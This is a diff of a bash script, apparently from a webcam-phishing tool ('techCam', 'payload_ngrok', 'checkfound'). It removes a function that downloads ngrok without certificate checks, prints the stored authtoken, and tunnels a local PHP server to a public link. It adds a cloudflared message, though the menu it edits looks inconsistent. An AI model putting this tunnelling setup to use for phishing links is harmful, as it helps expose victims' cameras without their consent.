@@ -174,76 +174,6 @@ fi
 fi
 }
 
-ngrok_server() {
-
-
-if [[ -e ngrok ]]; then
-echo ""
-else
-command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
-command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
-printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
-arch=$(uname -a | grep -o 'arm' | head -n1)
-arch2=$(uname -a | grep -o 'Android' | head -n1)
-if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
-wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
-
-if [[ -e ngrok-stable-linux-arm.zip ]]; then
-unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
-chmod +x ngrok
-rm -rf ngrok-stable-linux-arm.zip
-else
-printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
-exit 1
-fi
-
-else
-wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
-if [[ -e ngrok-stable-linux-386.zip ]]; then
-unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
-chmod +x ngrok
-rm -rf ngrok-stable-linux-386.zip
-else
-printf "\e[1;93m[!] Download error... \e[0m\n"
-exit 1
-fi
-fi
-fi
-if [[ -e ~/.ngrok2/ngrok.yml ]]; then
-printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
-cat  ~/.ngrok2/ngrok.yml
-read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
-if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
-read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
-./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
-fi
-else
-read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
-./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
-fi
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
-sleep 2
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
-./ngrok http 3333 > /dev/null 2>&1 &
-sleep 10
-
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
-if [[ -z "$link" ]]; then
-printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run this command killall ngrok\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
-exit 1
-else
-printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
-fi
-payload_ngrok
-checkfound
-}
-
 
 techCam() {
 if [[ -e sendlink ]]; then
@@ -251,7 +181,7 @@ rm -rf sendlink
 fi
 
 printf "\n-----Choose tunnel server----\n"    
-printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
 default_option_server="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
